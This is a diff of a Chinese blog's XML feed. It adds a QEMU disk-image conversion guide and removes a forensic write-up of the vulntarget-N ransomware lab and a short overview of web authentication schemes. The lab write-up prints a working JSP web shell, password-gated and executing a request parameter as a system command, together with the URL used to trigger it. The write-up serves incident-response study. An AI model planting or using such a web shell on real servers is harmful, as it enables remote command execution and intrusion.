+<h1 id="windows系统"><a href="#windows系统" class="headerlink" title="windows系统"></a>windows系统</h1><h1 id="安装qemu"><a href="#安装qemu" class="headerlink" title="安装qemu"></a>安装qemu</h1><p><a href="https://qemu.weilnetz.de/w64/">QEMU项目下载</a><br>选择qemu-w64-setup-20240903.exe </p>
+<h2 id="配置环境变量"><a href="#配置环境变量" class="headerlink" title="配置环境变量"></a>配置环境变量</h2><p>系统变量Path添加qemu安装路径</p>
+<h2 id="测试环境变量是否配置成功"><a href="#测试环境变量是否配置成功" class="headerlink" title="测试环境变量是否配置成功"></a>测试环境变量是否配置成功</h2><p>cmd输入</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">qemu-img --help</span><br></pre></td></tr></table></figure>
+<div class="tabs"><div class="nav-tabs"><button type="button" class="tab active">QCOW2转换为RAW格式</button><button type="button" class="tab">VHD转换为RAW格式</button><button type="button" class="tab">RAW转换为VMDK格式</button></div><div class="tab-contents"><div class="tab-item-content active"><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">qemu-img convert -f qcow2 -O raw centos.qcow2 centos.raw</span><br></pre></td></tr></table></figure></div><div class="tab-item-content"><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">qemu-img convert -f vpc -O raw centos.vhd centos.raw</span><br></pre></td></tr></table></figure></div><div class="tab-item-content"><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">qemu-img convert -f raw -O vmdk centos.raw centos.vmdk</span><br></pre></td></tr></table></figure></div></div><div class="tab-to-top"><button type="button" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div>
+]]></content>
+      <categories>
+        <category>格式转换工具</category>
+      </categories>
+      <tags>
+        <tag>镜像转换</tag>
       </tags>
   </entry>
   <entry>
@@ -1910,265 +2040,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>vulntarget-N勒索病毒靶场练习</title>
-    <url>/posts/4fea4d13.html</url>
-    <content><![CDATA[<h1 id="项目背景"><a href="#项目背景" class="headerlink" title="项目背景"></a>项目背景</h1><p><a href="https://blog.csdn.net/csdnmmd/article/details/139614037">https://blog.csdn.net/csdnmmd/article/details/139614037</a><br> vulntarget-n是一个模拟全球化勒索病毒高发环境下的应急响应和取证分析案例，其模拟了一个正常运行的业务服务被勒索病毒攻击的情景：<br>    01、客户在阿里云部署的业务环境<br>    02、今天突然发现首页变成了一个勒索的界面，要求用户支付赎金以解密数据<br>    03、客户发现其中部分重要文件被加密为.vulntarget结尾<br>随即客户要你进行应急响应并取证分析，因为是阿里云的ECS，客户将阿里云ECS实例镜像导出到本地，要求你在明天分析出结果。<br>具体要求如下：<br>    01、分析攻击事件是如何发生的，请给出攻击画像<br>    02、解密勒索<br>    03、恢复原来的index.jsp页面，恢复正常的web服务</p>
-<h1 id="服务器配置"><a href="#服务器配置" class="headerlink" title="服务器配置"></a>服务器配置</h1><p>阿里云ECS服务器-ubuntu vmdk镜像<br>账号 root<br>密码 Vulntarget@123(输入密码可shift+对应字符大写)</p>
-<h1 id="瞎找"><a href="#瞎找" class="headerlink" title="瞎找"></a>瞎找</h1><h2 id="xshell连接"><a href="#xshell连接" class="headerlink" title="xshell连接"></a>xshell连接</h2><p>单纯的ubuntu命令行看的眼瞎，用xshell工具连接好看点，也方便使用scp双向传输文件<br>先确定是否有相关开放的端口可供连接，看到开放了22端口，盲猜是不是端口爆破进来(虽然密码看着挺复杂的)</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">root@iZj6c6hytildlalnu0cwt4Z:~/history# netstat -ntulp</span><br><span class="line">Active Internet connections (only servers)</span><br><span class="line">Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    </span><br><span class="line">tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      570/systemd-resolve </span><br><span class="line">tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      756/sshd: /usr/sbin </span><br><span class="line">tcp        0      0 127.0.0.1:6010          0.0.0.0:*               LISTEN      1284/sshd: root@pts </span><br><span class="line">tcp6       0      0 127.0.0.1:8005          :::*                    LISTEN      703/java            </span><br><span class="line">tcp6       0      0 :::8009                 :::*                    LISTEN      703/java            </span><br><span class="line">tcp6       0      0 :::80                   :::*                    LISTEN      703/java            </span><br><span class="line">udp        0      0 127.0.0.53:53           0.0.0.0:*                           570/systemd-resolve </span><br><span class="line">udp        0      0 192.168.80.138:68       0.0.0.0:*                           642/systemd-network </span><br><span class="line">udp        0      0 127.0.0.1:323           0.0.0.0:*                           670/chronyd         </span><br><span class="line">udp6       0      0 ::1:323                 :::*                                670/chronyd </span><br></pre></td></tr></table></figure>
-<p>xshell连上还是好看多了<br><img src="/img/vulntargetN/xshell.png"></p>
-<h2 id="历史记录"><a href="#历史记录" class="headerlink" title="历史记录"></a>历史记录</h2><p>康康管理员或攻击者都用啥命令<br>两百多行啊，太多了，直接 history &gt;history.txt放文本里拿出来慢慢分析</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">oot@iZj6c6hytildlalnu0cwt4Z:~/history# cat history.txt </span><br><span class="line">    1      1  apt update &amp;&amp; apt install openjdk-8-jdk &amp;&amp; apt install unzip -y</span><br><span class="line">    2      2  vim /etc/profile</span><br><span class="line">    3      3  source /etc/profile</span><br><span class="line">    4      4  wget https://archive.apache.org/dist/tomcat/tomcat-7/v7.0.79/bin/apache-tomcat-7.0.79.zip</span><br><span class="line">    5      5  unzip apache-tomcat-7.0.79.zip</span><br><span class="line">    6      6  mv apache-tomcat-7.0.79 /opt/tomcatmv apache-tomcat-7.0.79 /opt/tomcat</span><br><span class="line">    7      7  mv apache-tomcat-7.0.79 /opt/tomcat</span><br><span class="line">    8      8  chmod +x /opt/tomcat/bin/*.sh</span><br><span class="line">    9      9  ls</span><br><span class="line">   10     10  history </span><br></pre></td></tr></table></figure>
-<h2 id="error小插曲"><a href="#error小插曲" class="headerlink" title="error小插曲"></a>error小插曲</h2><p>用scp将history文件传输至kali时出现以下问题</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@iZj6c6hytildlalnu0cwt4Z:~/history# scp history.txt kali@192.168.80.129:~/home/kali/desktop</span><br><span class="line">ssh: connect to host 192.168.80.129 port 22: Connection refused</span><br><span class="line">lost connection</span><br></pre></td></tr></table></figure>
-<p>可能的原因：<br><strong>SSH服务未运行</strong>(最后排查到，淦)</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# systemctl status ssh              </span><br><span class="line">○ ssh.service - OpenBSD Secure Shell server</span><br><span class="line">     Loaded: loaded (/lib/systemd/system/ssh.service; disabled; vendor preset: disabled)</span><br><span class="line">     Active: inactive (dead)</span><br><span class="line">       Docs: man:sshd(8)</span><br><span class="line">             man:sshd_config(5)</span><br><span class="line">                                                                                                                                                                                                                                                                     </span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# systemctl restart ssh   </span><br><span class="line">                                                                                                                                                                                                                                                                     </span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# systemctl status ssh </span><br><span class="line">● ssh.service - OpenBSD Secure Shell server</span><br><span class="line">     Loaded: loaded (/lib/systemd/system/ssh.service; disabled; vendor preset: disabled)</span><br><span class="line">     Active: active (running) since Mon 2024-11-04 02:55:45 EST; 2s ago</span><br><span class="line">       Docs: man:sshd(8)</span><br><span class="line">             man:sshd_config(5)</span><br></pre></td></tr></table></figure>
-<p>端口未开放</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ufw allow 22/tcp</span><br></pre></td></tr></table></figure>
-<p>网络问题</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">ping 192.168.80.129</span><br></pre></td></tr></table></figure>
-
-<h2 id="scp-传输文件"><a href="#scp-传输文件" class="headerlink" title="scp 传输文件"></a>scp 传输文件</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@iZj6c6hytildlalnu0cwt4Z:~/history# scp history.txt kali@192.168.80.129:/home/kali/Desktop</span><br><span class="line">The authenticity of host &#x27;192.168.80.129 (192.168.80.129)&#x27; can&#x27;t be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:ms0GOphjxpGNpSvxPadaF3Bwf8hg7vUA8sXv4ojqDwo.</span><br><span class="line">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="line">Warning: Permanently added &#x27;192.168.80.129&#x27; (ECDSA) to the list of known hosts.</span><br><span class="line">kali@192.168.80.129&#x27;s password: </span><br><span class="line">history.txt                                                                                                    100% 5816     4.2MB/s   00:00    </span><br></pre></td></tr></table></figure>
-<h2 id="分析历史记录"><a href="#分析历史记录" class="headerlink" title="分析历史记录"></a>分析历史记录</h2><p>第一部分是apache的tomcat环境搭建，第二部分是模拟黑客的勒索病毒加密攻击<br>将上传的vulntargetn.jsp改名未404.jsp<br>历史记录显示的敏感文件：<br>get_pem.py<br>encrypt_vulntarget.py<br>flag.jsp<br>pubkey.pem<br>privkey.pem<br>localhost_access_log.2024-06-04.txt</p>
-<div class="tabs"><div class="nav-tabs"><button type="button" class="tab active">历史记录</button><button type="button" class="tab">历史记录分析</button><button type="button" class="tab">路径操作</button></div><div class="tab-contents"><div class="tab-item-content active"><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1      1  apt update &amp;&amp; apt install openjdk-8-jdk &amp;&amp; apt install unzip -y</span><br><span class="line">   2      2  vim /etc/profile</span><br><span class="line">   3      3  source /etc/profile</span><br><span class="line">   4      4  wget https://archive.apache.org/dist/tomcat/tomcat-7/v7.0.79/bin/apache-tomcat-7.0.79.zip</span><br><span class="line">   5      5  unzip apache-tomcat-7.0.79.zip</span><br><span class="line">   6      6  mv apache-tomcat-7.0.79 /opt/tomcatmv apache-tomcat-7.0.79 /opt/tomcat</span><br><span class="line">   7      7  mv apache-tomcat-7.0.79 /opt/tomcat</span><br><span class="line">   8      8  chmod +x /opt/tomcat/bin/*.sh</span><br><span class="line">   9      9  ls</span><br><span class="line">  10     10  history </span><br><span class="line">  11     11  flag&#123;vulntarget_very_G00d&#125;</span><br><span class="line">  12     12  /opt/tomcat/bin/startup.sh</span><br><span class="line">  13     13  cp /opt/tomcat/conf/server.xml /opt/tomcat/conf/server.xml.bak</span><br><span class="line">  14     14  vim /opt/tomcat/conf/server.xml</span><br><span class="line">  15     15  ps -axu | grep tomcat</span><br><span class="line">  16     16  kill -9 6961</span><br><span class="line">  17     17  /opt/tomcat/bin/startup.sh</span><br><span class="line">  18     18  cp web.xml web.xml.bak</span><br><span class="line">  19     19  pwd </span><br><span class="line">  20     20  cd ..</span><br><span class="line">  21     21  ls</span><br><span class="line">  22     22  cd /opt/</span><br><span class="line">  23     23  ls</span><br><span class="line">  24     24  cd tomcat/</span><br><span class="line">  25     25  ls</span><br><span class="line">  26     26  cd conf/</span><br><span class="line">  27     27  cp web.xml web.xml.bak</span><br><span class="line">  28     28  vim web.xml</span><br><span class="line">  29     29  ps -axu | grep tomcat</span><br><span class="line">  30     30  kill -9 7409</span><br><span class="line">  31     31  /opt/tomcat/bin/startup.sh</span><br><span class="line">  32     32  pwd </span><br><span class="line">  33     33  cd ..</span><br><span class="line">  34     34  ls</span><br><span class="line">  35     35  cd webapps/</span><br><span class="line">  36     36  ls</span><br><span class="line">  37     37  cd ROOT/</span><br><span class="line">  38     38  ls</span><br><span class="line">  39     39  rm favicon.ico </span><br><span class="line">  40     40  cp index.jsp index.jsp.bak</span><br><span class="line">  41     41  ls</span><br><span class="line">  42     42  vim index.jsp</span><br><span class="line">  43     43  rm index.jsp</span><br><span class="line">  44     44  vim index.jsp</span><br><span class="line">  45     45  crontab -e</span><br><span class="line">  46     46  history </span><br><span class="line">  47     47  ls</span><br><span class="line">  48     48  mv vulntargetn.jsp 404.jsp</span><br><span class="line">  49     49  ls</span><br><span class="line">  50     50  rm index.jsp.bak</span><br><span class="line">  51     51  pip3 install rsa</span><br><span class="line">  52     52  ls</span><br><span class="line">  53     53  ls -lha</span><br><span class="line">  54     54  mkdir .vulntarget</span><br><span class="line">  55     55  cd .vulntarget/</span><br><span class="line">  56     56  ls</span><br><span class="line">  57     57  mkdir keys</span><br><span class="line">  58     58  ls</span><br><span class="line">  59     59  history </span><br><span class="line">  60     60  ls</span><br><span class="line">  61     61  vim get_pem.py</span><br><span class="line">  62     62  python3 get_pem.py </span><br><span class="line">  63     63  ls</span><br><span class="line">  64     64  rm get_pem.py </span><br><span class="line">  65     65  ls</span><br><span class="line">  66     66  cd ..</span><br><span class="line">  67     67  ls</span><br><span class="line">  68     68  cp .vulntarget/keys/pubkey.pem .</span><br><span class="line">  69     69  ls</span><br><span class="line">  70     70  ls | grep jsp</span><br><span class="line">  71     71  vim encrypt_vulntarget.py</span><br><span class="line">  72     72  ls</span><br><span class="line">  73     73  vim flag.jsp</span><br><span class="line">  74     74  ls | grep jsp</span><br><span class="line">  75     75  python3 encrypt_vulntarget.py </span><br><span class="line">  76     76  ls</span><br><span class="line">  77     77  cd .vulntarget/</span><br><span class="line">  78     78  ls</span><br><span class="line">  79     79  cd keys/</span><br><span class="line">  80     80  ls</span><br><span class="line">  81     81  cat pubkey.pem </span><br><span class="line">  82     82  cat privkey.pem </span><br><span class="line">  83     83  cd ..</span><br><span class="line">  84     84  ls</span><br><span class="line">  85     85  cd ..</span><br><span class="line">  86     86  ls</span><br><span class="line">  87     87  rm encrypt_vulntarget.py </span><br><span class="line">  88     88  rm pubkey.pem </span><br><span class="line">  89     89  ls</span><br><span class="line">  90     90  vim index.jsp</span><br><span class="line">  91     91  ls</span><br><span class="line">  92     92  cd ..</span><br><span class="line">  93     93  ls</span><br><span class="line">  94     94  cd ..</span><br><span class="line">  95     95  ls</span><br><span class="line">  96     96  cd logs/</span><br><span class="line">  97     97  ls</span><br><span class="line">  98     98  cat localhost_access_log.2024-06-04.txt </span><br><span class="line">  99     99  vim localhost_access_log.2024-06-04.txt </span><br><span class="line"> 100    100  ls</span><br><span class="line"> 101    101  vim localhost_access_log.2024-06-04.txt </span><br><span class="line"> 102    102  ls</span><br><span class="line"> 103    103  history </span><br><span class="line"> 104    104  curl http://127.0.0.1</span><br><span class="line"> 105    105  ls</span><br><span class="line"> 106    106  cd </span><br><span class="line"> 107    107  ls</span><br><span class="line"> 108    108  ls -lha</span><br><span class="line"> 109    109  cat .bashrc </span><br><span class="line"> 110    110  ls</span><br><span class="line"> 111    111  history &gt; .bash_history</span><br></pre></td></tr></table></figure></div><div class="tab-item-content"><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">安装openjdk和unzip命令工具</span><br><span class="line"></span><br><span class="line">下载apache压缩包并解压</span><br><span class="line"></span><br><span class="line">tomcat/bin下sh文件赋权</span><br><span class="line"></span><br><span class="line">有个flag flag&#123;vulntarget_very_G00d&#125;</span><br><span class="line"></span><br><span class="line">配置apache服务器</span><br><span class="line"></span><br><span class="line">打开定时任务并编辑(待会康康定时任务都有啥)</span><br><span class="line"></span><br><span class="line">安装rsa(看起来是准备加密了)</span><br><span class="line"></span><br><span class="line">ls -lha查看当前目录下详细信息</span><br><span class="line"></span><br><span class="line">创建隐藏文件夹.vulntarget</span><br><span class="line">创建key文件夹</span><br><span class="line"></span><br><span class="line">创建 get_pem.py(似乎是rsa创建密钥的代码)</span><br><span class="line"></span><br><span class="line">python 运行 get_pem.py</span><br><span class="line"></span><br><span class="line">删除get_pem.py</span><br><span class="line"></span><br><span class="line">ls | grep jsp查看所有名称包含jsp的文件</span><br><span class="line"></span><br><span class="line">创建encrypt_vulntarget.py(似乎是加密代码)</span><br><span class="line"></span><br><span class="line">创建flag.jsp</span><br><span class="line"></span><br><span class="line">python3 运行encrypt_vulntarget.py</span><br><span class="line"></span><br><span class="line">查看生成的公钥和私钥</span><br><span class="line">cat pubkey.pem </span><br><span class="line">cat privkey.pem </span><br><span class="line"></span><br><span class="line">删除 encrypt_vulntarget.py和pubkey.pem</span><br><span class="line"></span><br><span class="line">编辑localhost_access_log.2024-06-04.txt日志文件</span><br><span class="line"></span><br><span class="line">curl http://127.0.0.1</span><br></pre></td></tr></table></figure></div><div class="tab-item-content"><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd ..</span><br><span class="line"></span><br><span class="line">cd /opt/</span><br><span class="line"></span><br><span class="line">cd tomcat/</span><br><span class="line"></span><br><span class="line">cd conf/</span><br><span class="line"></span><br><span class="line">cd ..</span><br><span class="line"></span><br><span class="line">cd webapps/</span><br><span class="line"></span><br><span class="line">cd ROOT/</span><br><span class="line"></span><br><span class="line">ROOT下创建.vulntarget文件夹</span><br><span class="line"></span><br><span class="line">cd .vulntarget/ mkdir keys</span><br><span class="line"></span><br><span class="line">创建get_pem.py</span><br><span class="line">运行get_pem.py 生成了pubkey和privkey</span><br><span class="line"></span><br><span class="line">cd ..</span><br><span class="line"></span><br><span class="line">ROOT目录下cp .vulntarget/keys/pubkey.pem .</span><br><span class="line"></span><br><span class="line">ROOT目录下创建 encrypt_vulntarget.py</span><br><span class="line"></span><br><span class="line">创建 flag.jsp</span><br><span class="line"></span><br><span class="line">加密 python3 encrypt_vulntarget.py </span><br><span class="line"></span><br><span class="line">cd .vulntarget/</span><br><span class="line"></span><br><span class="line">cd keys/</span><br><span class="line"></span><br><span class="line">cat查看pubkey和privkey</span><br><span class="line"></span><br><span class="line">cd ..</span><br><span class="line"></span><br><span class="line">cd ..</span><br><span class="line"></span><br><span class="line">ROOT目录下删除encrypt_vulntarget.py</span><br><span class="line"></span><br><span class="line">删除pubkey</span><br><span class="line"></span><br><span class="line">cd..</span><br><span class="line"></span><br><span class="line">cd..</span><br><span class="line"></span><br><span class="line">cd logs/</span><br></pre></td></tr></table></figure></div></div><div class="tab-to-top"><button type="button" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div>
-<h2 id="痕迹"><a href="#痕迹" class="headerlink" title="痕迹"></a>痕迹</h2><p>看看是否有遗留文件<br>存在公钥和私钥以及发现可疑jsp文件后缀vulntarget<br>结合项目背景可确认加密后缀为vulntarget，加密目录为&#x2F;opt&#x2F;tomcat&#x2F;webapps&#x2F;ROOT&#x2F;</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@iZj6c6hytildlalnu0cwt4Z:~# find / -iname &quot;*pubkey*&quot;</span><br><span class="line">/usr/lib/crda/pubkeys</span><br><span class="line">/opt/tomcat/webapps/ROOT/.vulntarget/keys/pubkey.pem</span><br><span class="line">root@iZj6c6hytildlalnu0cwt4Z:~# find / -iname &quot;*privkey*&quot;</span><br><span class="line">/opt/tomcat/webapps/ROOT/.vulntarget/keys/privkey.pem</span><br><span class="line">root@iZj6c6hytildlalnu0cwt4Z:~# find / -iname &quot;*get_pem*&quot;</span><br><span class="line">root@iZj6c6hytildlalnu0cwt4Z:~# find / -iname &quot;*encrypt_vulntarget*&quot;</span><br><span class="line">root@iZj6c6hytildlalnu0cwt4Z:~# find / -iname &quot;*flag.jsp*&quot;</span><br><span class="line">/opt/tomcat/webapps/ROOT/flag.jsp.vulntarget</span><br><span class="line">root@iZj6c6hytildlalnu0cwt4Z:~# find / -iname &quot;*localhost_access_log。2024-06.*&quot;</span><br><span class="line">/opt/tomcat/logs/localhost_access_log.2024-06-04.txt</span><br></pre></td></tr></table></figure>
-<h2 id="勒索解密"><a href="#勒索解密" class="headerlink" title="勒索解密"></a>勒索解密</h2><h2 id="分析localhost-access-log日志"><a href="#分析localhost-access-log日志" class="headerlink" title="分析localhost_access_log日志"></a>分析localhost_access_log日志</h2><p>日志太长不做展示</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@iZj6c6hytildlalnu0cwt4Z:/opt/tomcat/logs# cat localhost_access_log.2024-06-04.txt</span><br></pre></td></tr></table></figure>
-<p>日志查看发现上传了两个可疑文件<br><img src="/img/vulntargetN/put.png"><br>搜索文件位置</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@iZj6c6hytildlalnu0cwt4Z:~# find / -type f -iname vulntarget.jsp*</span><br><span class="line">/opt/tomcat/webapps/ROOT/vulntarget.jsp.vulntarget</span><br></pre></td></tr></table></figure>
-<p>查看&#x2F;opt&#x2F;tomcat&#x2F;webapps&#x2F;ROOT下的文件<br>发现当前目录下被加密的文件</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">404.jsp.vulntarget</span><br><span class="line">flag.jsp.vulntarget</span><br><span class="line">index.jsp.vulntarget</span><br><span class="line">vulntarget.jsp.vulntarget</span><br></pre></td></tr></table></figure>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">root@iZj6c6hytildlalnu0cwt4Z:~# cd /opt/tomcat/webapps/ROOT/</span><br><span class="line">root@iZj6c6hytildlalnu0cwt4Z:/opt/tomcat/webapps/ROOT# ll</span><br><span class="line">total 188</span><br><span class="line">drwxr-xr-x 4 root root  4096 Jun  4 14:38 ./</span><br><span class="line">drwxr-xr-x 7 root root  4096 Jun 26  2017 ../</span><br><span class="line">-rw-r--r-- 1 root root   684 Jun  4 14:37 404.jsp.vulntarget</span><br><span class="line">-rw-r--r-- 1 root root 26726 Jun 26  2017 asf-logo-wide.svg</span><br><span class="line">-rw-r--r-- 1 root root   713 Jun 26  2017 bg-button.png</span><br><span class="line">-rw-r--r-- 1 root root  1918 Jun 26  2017 bg-middle.png</span><br><span class="line">-rw-r--r-- 1 root root  1392 Jun 26  2017 bg-nav-item.png</span><br><span class="line">-rw-r--r-- 1 root root  1401 Jun 26  2017 bg-nav.png</span><br><span class="line">-rw-r--r-- 1 root root  3103 Jun 26  2017 bg-upper.png</span><br><span class="line">-rw-r--r-- 1 root root   172 Jun  4 14:37 flag.jsp.vulntarget</span><br><span class="line">-rw-r--r-- 1 root root   881 Jun  4 14:38 index.jsp</span><br><span class="line">-rw-r--r-- 1 root root  3244 Jun  4 14:37 index.jsp.vulntarget</span><br><span class="line">-rw-r--r-- 1 root root  9195 Jun 26  2017 RELEASE-NOTES.txt</span><br><span class="line">-rw-r--r-- 1 root root  5931 Jun 26  2017 tomcat.css</span><br><span class="line">-rw-r--r-- 1 root root  2066 Jun 26  2017 tomcat.gif</span><br><span class="line">-rw-r--r-- 1 root root  5103 Jun 26  2017 tomcat.png</span><br><span class="line">-rw-r--r-- 1 root root  2376 Jun 26  2017 tomcat-power.gif</span><br><span class="line">-rw-r--r-- 1 root root 68761 Jun 26  2017 tomcat.svg</span><br><span class="line">drwxr-xr-x 3 root root  4096 Jun  4 14:35 .vulntarget/</span><br><span class="line">-rw-r--r-- 1 root root   172 Jun  4 14:37 vulntarget.jsp.vulntarget</span><br><span class="line">drwxr-xr-x 2 root root  4096 Jun 26  2017 WEB-INF/</span><br></pre></td></tr></table></figure>
-
-<h2 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h2><p>通过历史记录分析以及命令搜索可知加密的公钥和私钥未被删除，生成的密钥为pubkey.pem和privkey.pem<br>使用相关工具进行解密文件：<br>flag.jsp<br><img src="/img/vulntargetN/flag.png"><br>vulntarget.jsp<br><img src="/img/vulntargetN/hack.png"><br>404.jsp.vulntarget</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    if(&quot;vulntarget&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;</span><br><span class="line">        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();</span><br><span class="line">        int a = -1;</span><br><span class="line">        byte[] b = new byte[2048];</span><br><span class="line">        out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line">        while((a=in.read(b))!=-1)&#123;</span><br><span class="line">            out.println(new String(b));</span><br><span class="line">        &#125;</span><br><span class="line">        out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta prompt_">%</span><span class="language-bash">&gt;</span></span><br></pre></td></tr></table></figure>
-
-<h1 id="攻击路径分析"><a href="#攻击路径分析" class="headerlink" title="攻击路径分析"></a>攻击路径分析</h1><h2 id="access-log日志分析"><a href="#access-log日志分析" class="headerlink" title="access_log日志分析"></a>access_log日志分析</h2><p>04&#x2F;Jun&#x2F;2024 14:31:18 通过apache tomcat PUT任意文件上传漏洞上传vulntarget.jsp<br>04&#x2F;Jun&#x2F;2024 14:33:37 通过apache tomcat PUT任意文件上传漏洞上传vulntargetn.jsp<br>(为防止靶场制作者信息泄露未执行反弹shell)<br>04&#x2F;Jun&#x2F;2024 14:33:57 GET请求路径 &#x2F;vulntargetn.jsp?pwd&#x3D;vulntarget&amp;i&#x3D;whoami 成功</p>
-<h2 id="历史命令分析"><a href="#历史命令分析" class="headerlink" title="历史命令分析"></a>历史命令分析</h2><p>opt&#x2F;tomcat&#x2F;webapps&#x2F;ROOT目录</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rm vulntargetn.jsp 404.jsp</span><br><span class="line">pip3 install rsa</span><br><span class="line">mkdir .vulntarget</span><br><span class="line">cd .vulntarget/</span><br></pre></td></tr></table></figure>
-<p>opt&#x2F;tomcat&#x2F;webapps&#x2F;ROOT&#x2F;.vulntarget目录</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir keys</span><br><span class="line">cd keys</span><br></pre></td></tr></table></figure>
-<p>opt&#x2F;tomcat&#x2F;webapps&#x2F;ROOT&#x2F;.vulntarget&#x2F;keys目录</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim get_pem.py</span><br><span class="line">python3 get_pem.py</span><br><span class="line">rm get_pem.py</span><br><span class="line">cd ..</span><br></pre></td></tr></table></figure>
-<p>opt&#x2F;tomcat&#x2F;webapps&#x2F;ROOT&#x2F;.vulntarget目录</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cp .vulntarget/keys/pubkey.pem .</span><br><span class="line">ls | grep jsp</span><br><span class="line">vim encrypt_vulntarget.py</span><br><span class="line">python3 encrypt_vulntarget.py</span><br><span class="line">rm encrypt_vulntarget.py</span><br><span class="line">rm pubkey.pem</span><br><span class="line">cd ../../logs/</span><br></pre></td></tr></table></figure>
-<p>opt&#x2F;tomcat&#x2F;logs目录</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vim localhost_access_log.2024-06-04.txt</span><br></pre></td></tr></table></figure>
-]]></content>
-      <categories>
-        <category>Web安全</category>
-      </categories>
-      <tags>
-        <tag>恶意软件</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>web认证机制与攻击方式</title>
-    <url>/posts/65c9aba7.html</url>
-    <content><![CDATA[<p><a href="https://websec.readthedocs.io/zh/latest/auth/index.html">https://websec.readthedocs.io/zh/latest/auth/index.html</a></p>
-<h1 id="http-basic-auth-http-基础授权-早期"><a href="#http-basic-auth-http-基础授权-早期" class="headerlink" title="http basic auth (http 基础授权 早期)"></a>http basic auth (http 基础授权 早期)</h1><p>访问url请求头需包含用户名和密码<br>若未收到http basic auth 返回401，并返回basic值的请求头www-authenticate及参数realm<br>如apache后台访问会跳一个要求输入账密的弹窗，抓包发现请求头的authentication: basic 一串密文，这串密文为base64加密<br>摘: <a href="https://fastapi.tiangolo.com/zh/advanced/security/http-basic-auth/#_4">https://fastapi.tiangolo.com/zh/advanced/security/http-basic-auth/#_4</a></p>
-<h1 id="MFA-Multi-Factor-Authentication-多因子认证"><a href="#MFA-Multi-Factor-Authentication-多因子认证" class="headerlink" title="MFA (Multi-Factor Authentication 多因子认证)"></a>MFA (Multi-Factor Authentication 多因子认证)</h1><p>即多种方式对用户身份进行验证。<br>在web端的多因子认证能大大提高系统安全，但在部分系统中，不同因子的认证可能互不相关，或因为代码逻辑缺陷导致存在漏洞。<br>摘: <a href="https://web-sec.gitbook.io/wsa/server-side/authentication/multi-factor">https://web-sec.gitbook.io/wsa/server-side/authentication/multi-factor</a></p>
-<h1 id="SSO-Single-Sign-On"><a href="#SSO-Single-Sign-On" class="headerlink" title="SSO (Single Sign On)"></a>SSO (Single Sign On)</h1><p>一个用户可以通过单一的ID和凭证（密码）访问多个相关但彼此独立的系统<br>摘: <a href="https://xz.aliyun.com/t/13848?u_atoken=d49d5dca49ffa2ce7464a3d509241079&u_asig=1a0c399a17276105611338740e012d">https://xz.aliyun.com/t/13848?u_atoken=d49d5dca49ffa2ce7464a3d509241079&amp;u_asig=1a0c399a17276105611338740e012d</a></p>
-<h1 id="JWT令牌-Json-Web-Token"><a href="#JWT令牌-Json-Web-Token" class="headerlink" title="JWT令牌 (Json Web Token)"></a>JWT令牌 (Json Web Token)</h1><p>常用于分布式站点的SSO场景<br>摘: <a href="https://www.v0n.top/2019/11/01/%E6%B5%85%E8%B0%88JWT%E7%BB%95%E8%BF%87/">https://www.v0n.top/2019/11/01/%E6%B5%85%E8%B0%88JWT%E7%BB%95%E8%BF%87/</a></p>
-<h1 id="Oauth2"><a href="#Oauth2" class="headerlink" title="Oauth2"></a>Oauth2</h1><p>OAuth2.0 是一个被广泛使用的授权框架。能满足网站和WEB程序对另一个应用程序上用户账户数据的有限访问。允许用户在不公开登陆账号密码等凭据的情况下，授权第三方访问权限，实现不同应用间的账户认证。<br>摘: <a href="https://xz.aliyun.com/t/13349?u_atoken=90475d2a0b9fa049a3c8a0e2e2aaeb7e&u_asig=1a0c384b17276185334966303e0049">https://xz.aliyun.com/t/13349?u_atoken=90475d2a0b9fa049a3c8a0e2e2aaeb7e&amp;u_asig=1a0c384b17276185334966303e0049</a></p>
